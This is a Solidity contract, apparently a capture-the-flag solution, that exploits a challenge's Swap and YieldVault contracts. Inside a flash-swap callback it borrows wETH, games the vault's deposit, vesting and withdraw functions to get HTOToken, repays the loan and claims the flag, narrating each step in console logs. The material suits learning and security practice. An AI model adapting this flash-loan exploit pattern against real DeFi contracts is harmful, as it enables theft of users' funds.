// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { Swap } from "../src/Swap.sol";
import { WETH } from "../src/WETH.sol";
import { HTOToken } from "../src/HTOToken.sol";
import { YieldVault } from "../src/YieldVault.sol";
import { console } from "../lib/forge-std/src/console.sol";
import { IERC721Receiver } from "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external;
}

contract MaliciousCallee is IUniswapV2Callee, IERC721Receiver {
    Swap public swapContract;
    WETH public wETH;
    HTOToken public htoToken;
    YieldVault public yieldVault;
    string public flag;
    address public player;

    constructor(address _swapContract, address _player, address _wETH, address _htoToken, address _yieldVault) {
        swapContract = Swap(_swapContract);
        player = _player;
        wETH = WETH(_wETH);
        htoToken = HTOToken(_htoToken);
        yieldVault = YieldVault(_yieldVault);
    }

    function uniswapV2Call(address maliciousCallee, uint amount0Out, uint amount1Out, bytes calldata data) external override {
        console.log("balance of wETH after borrowing (calling swap()): ", wETH.balanceOf(address(this)));
        console.log("Let's use the borrowed wETH to get HTOToken before returning it back");
        console.log("We can call deposit() to get qualified first and call vesting() to get HTOToken and then withdraw() to get wETH back");
        wETH.approve(address(yieldVault), 200000002);
        yieldVault.deposit(200000002);
        yieldVault.vesting(0);
        console.log("balance of HTOToken after calling vesting() : ", htoToken.balanceOf(address(this)));
        yieldVault.withdraw(0, true);
        console.log("balance of HTOToken after calling withdraw() : ", htoToken.balanceOf(address(this)));
        console.log("Nice we have enough HTOToken dy, let's return the wETH back");
        wETH.transfer(address(swapContract),200000002);
    }

    function swap() public {
        htoToken.approve(address(swapContract), 200000002);
        swapContract.swap(0, 200000002, address(this), "");
        console.log("balance of HTOToken after calling swap() : ", htoToken.balanceOf(address(this)));
        console.log("balance of wETH after calling swap() : ", wETH.balanceOf(address(this)));
        console.log("Since we have more than 100000000 wETH after swapping it by using HTOToken, we can call flag() to get the flag");
        string memory flag = wETH.flag();
        console.log("Flag:", flag);
        console.log("balance of wETH after calling flag() : ", wETH.balanceOf(address(this)));
        console.log("You can see the wETH get burned after calling flag()");
    }

    function getFlag() external view returns (string memory) {
        return flag;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // Log the receipt of the ERC721 token (optional)
        console.log("Token Id of ERC721 token received:", tokenId);

        // Return the selector to confirm the token transfer
        return this.onERC721Received.selector;
    }
}